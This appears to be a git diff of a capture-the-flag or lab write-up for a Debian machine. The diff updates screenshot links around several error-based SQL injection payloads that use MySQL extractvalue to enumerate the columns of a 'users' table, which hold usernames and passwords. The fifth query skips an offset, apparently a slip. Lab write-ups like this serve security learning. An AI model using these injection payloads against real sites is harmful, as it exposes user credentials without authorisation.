@@ -103,13 +103,13 @@ Machine IP: 10.10.10.113 - Debian
 ## Columns
   - Extract: Column names in the table `users`.
   - Query (Column 1): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 0,1)))-- -`.
-![image](https://user-images.githubusercontent.com/83878909/229364114-7403598b-a0f4-463b-9ede-5933269491f1.png)
+![image](https://user-images.githubusercontent.com/83878909/229364564-7f7b5fbe-e17b-4c60-b28e-e9c8b36a9e4a.png)
   - Query (Column 2): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 1,1)))-- -`.
 ![image](https://user-images.githubusercontent.com/83878909/229364190-97f1d230-b4a4-45d8-900a-50c7707eb9fd.png)
   - Query (Column 3): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 2,1)))-- -`.
 ![image](https://user-images.githubusercontent.com/83878909/229364271-a10fe1c5-7311-4d04-9c64-96141184e967.png)
   - Query (Column 4): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 3,1)))-- -`.
- ![image](https://user-images.githubusercontent.com/83878909/229364340-20cdc2a5-11c2-4abf-8548-542a58d86057.png)
+![image](https://user-images.githubusercontent.com/83878909/229364423-652f1974-229c-49b6-a88c-e6d010103f4b.png)
   - Query (Column 5): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 5,1)))-- -`.
-
+![image](https://user-images.githubusercontent.com/83878909/229364516-a25c1339-8f3c-4d66-8691-251dab9d1289.png)
 - Columns Found: id, username, password, mail and role.
